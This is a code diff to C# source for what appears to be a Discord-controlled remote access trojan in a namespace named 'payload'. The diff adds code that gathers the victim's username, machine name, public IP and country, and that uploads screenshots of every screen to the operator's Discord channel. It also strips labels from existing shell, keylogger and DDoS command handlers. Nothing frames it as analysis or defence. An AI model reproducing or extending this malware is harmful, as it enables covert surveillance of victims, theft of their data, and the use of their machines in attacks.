@@ -20,8 +20,6 @@ using Discord.WebSocket;
 using Newtonsoft.Json;
 using AForge.Video.DirectShow;
 using AForge.Video;
-using Discord.Net.Rest;
-using Discord.Net.WebSockets;
 
 namespace payload
 {
@@ -141,9 +139,26 @@ namespace payload
 
             switch (cmd)
             {
-                // Stealer module
                 case "get":
                     {
+                        string address = string.Empty;
+                        string location = string.Empty;
+                        try
+                        {
+                            // Sometimes fails, currently unsure what causes this.
+                            WebClient wc = new WebClient();
+                            address = wc.DownloadString("https://api.ipify.org");
+                            location = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={address}"))["country_name"];
+                            wc.Dispose();
+                        }
+                        catch { }
+
+                        await message.Channel.SendMessageAsync($"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}\nIP address: {address}\nIP location: {location}");
+                        break;
+                    }
+                case "getsc":
+                    {
+                        if (args[0] != Environment.MachineName) break;
                         List<FileAttachment> screenshots = new List<FileAttachment>();
                         foreach (Screen screen in Screen.AllScreens)
                         {
@@ -158,7 +173,7 @@ namespace payload
 
                             screenshots.Add(new FileAttachment(ms, "unknown.png"));
                         }
-                        await message.Channel.SendFilesAsync(screenshots, $"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}");
+                        await message.Channel.SendFilesAsync(screenshots);
                         foreach (FileAttachment fa in screenshots) fa.Dispose();
                         break;
                     }
@@ -217,18 +232,7 @@ namespace payload
                         searcher.Dispose();
                         break;
                     }
-                case "ipinfo":
-                    {
-                        if (args[0] != Environment.MachineName) break;
-                        WebClient wc = new WebClient();
-                        string address = wc.DownloadString("https://api.ipify.org/?format=txt");
-                        string location = JsonConvert.DeserializeObject<Dictionary<string, string>>(wc.DownloadString($"https://api.iplocation.net/?ip={address}"))["country_name"];
-                        wc.Dispose();
-                        await message.Channel.SendMessageAsync($"IP address: {address}\nLocation: {location}");
-                        break;
-                    }
 
-                // Remote Access Module
                 case "shell":
                     {
                         if (args[0] != Environment.MachineName) break;
@@ -262,7 +266,7 @@ namespace payload
                         break;
                     }
 
-                // Keylogger Module
+
                 case "startkeylogger":
                     {
                         if (args[0] != Environment.MachineName) break;
@@ -287,7 +291,7 @@ namespace payload
                         break;
                     }
 
-                // DDOS Module
+
                 case "startddos":
                     {
                         ddos = true;
@@ -303,7 +307,7 @@ namespace payload
                         break;
                     }
 
-                // Miscellaneous
+
                 case "uninfect":
                     {
                         if (args[0] != Environment.MachineName && args[0].ToLower() != "all") break;
